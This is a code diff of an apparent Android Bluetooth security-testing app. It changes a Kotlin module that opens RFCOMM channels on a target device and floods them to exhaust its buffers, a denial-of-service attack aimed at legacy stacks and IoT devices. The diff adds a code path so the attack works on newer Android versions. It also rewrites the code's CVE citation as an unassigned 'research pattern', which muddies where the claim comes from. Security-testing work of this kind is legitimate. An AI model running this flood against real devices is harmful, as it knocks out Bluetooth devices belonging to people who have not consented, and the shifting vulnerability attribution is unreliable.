@@ -3,6 +3,7 @@ package com.bluetoothseclab.attacks
 import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothSocket
 import android.content.Context
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import com.bluetoothseclab.models.AttackResult
@@ -11,11 +12,14 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
 
 /**
- * RFCOMM Buffer Flood DoS (CVE-2026-31280 pattern).
+ * RFCOMM Buffer Flood DoS.
  *
- * Real attack: opens RFCOMM connections and floods with large payloads
+ * Research pattern: opens RFCOMM connections and floods with large payloads
  * to exhaust the target's RFCOMM buffer space. Legacy Bluetooth stacks
  * have limited buffer allocation per RFCOMM channel.
+ *
+ * Similar to techniques described in Bluetooth SIG security advisories
+ * regarding RFCOMM resource exhaustion on constrained devices.
  *
  * No root required — uses standard Android BluetoothSocket API.
  *
@@ -117,17 +121,23 @@ object RfcommBufferFlood {
 
                     // Try secure first, then insecure
                     try {
-                        val createMethod = try {
-                            device.javaClass.getDeclaredMethod("createRfcommSocket", Int::class.java)
-                        } catch (_: NoSuchMethodException) {
-                            device.javaClass.getDeclaredMethod("createInsecureRfcommSocket", Int::class.java)
+                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
+                            val createMethod = try {
+                                device.javaClass.getDeclaredMethod("createRfcommSocket", Int::class.java)
+                            } catch (_: NoSuchMethodException) {
+                                device.javaClass.getDeclaredMethod("createInsecureRfcommSocket", Int::class.java)
+                            }
+                            createMethod.isAccessible = true
+                            socket = createMethod.invoke(device, channel) as BluetoothSocket
+                        } else {
+                            socket = device.createRfcommSocketToServiceRecord(
+                                java.util.UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
+                            )
                         }
-                        createMethod.isAccessible = true
-                        socket = createMethod.invoke(device, channel) as BluetoothSocket
-                        socket.connect()
+                        socket?.connect()
                         connected = true
                         channelsOpened.incrementAndGet()
-                        openSockets.add(socket)
+                        openSockets.add(socket!!)
                         handler.post { onProgress("[RFCOMM-FLOOD] ✓ Channel $channel open") }
                     } catch (_: Exception) {
                         connected = false
@@ -231,7 +241,7 @@ object RfcommBufferFlood {
                             "This indicates the target's RFCOMM buffers are exhausted. " +
                             "Legacy stacks (e.g. Parani M10, older IoT) are especially vulnerable.",
                         severity = AttackResult.Severity.CRITICAL,
-                        cveReference = "CVE-2026-31280 (pattern)",
+                        cveReference = "RFCOMM resource exhaustion pattern (no assigned CVE)",
                         remediation = "Upgrade Bluetooth stack, implement per-channel rate limiting"
                     ))
                 }
